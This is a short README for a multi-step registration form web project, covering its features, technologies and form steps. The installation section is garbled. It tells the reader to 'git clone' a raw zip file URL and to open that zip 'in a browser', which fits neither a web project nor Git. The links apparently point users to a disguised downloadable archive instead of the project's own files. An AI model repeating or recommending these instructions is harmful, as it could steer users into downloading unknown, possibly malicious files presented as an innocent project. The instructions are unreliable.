# Multi-Step Registration Form
A simple and interactive multi-step registration form built using HTML, CSS, and JavaScript. This form collects user details such as name, email, and interests while providing validation and a smooth user experience.

# 🚀 Features
- Multi-step Form: Users progress through different steps for a seamless experience.
- Form Validation: Ensures valid name, email, and topic selection before proceeding.
- Dynamic Step Indicator: Highlights the current step for better navigation.
- Local Storage: Saves user data temporarily to enhance usability.
- Responsive Design: Optimized for desktop and mobile screens.

# 🛠️ Technologies Used
- HTML: Structure of the form
- CSS: Styling and layout
- JavaScript: Form validation and step navigation

# 📝 Installation & Usage
1. Clone the repository:
   `git clone https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip`
2. Open the project folder and launch https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip in a browser.

# 🔧 How It Works
1. Step 1: Enter name and email (validated).
2. Step 2: Select at least one interest.
3. Step 3: Review your details before submission.
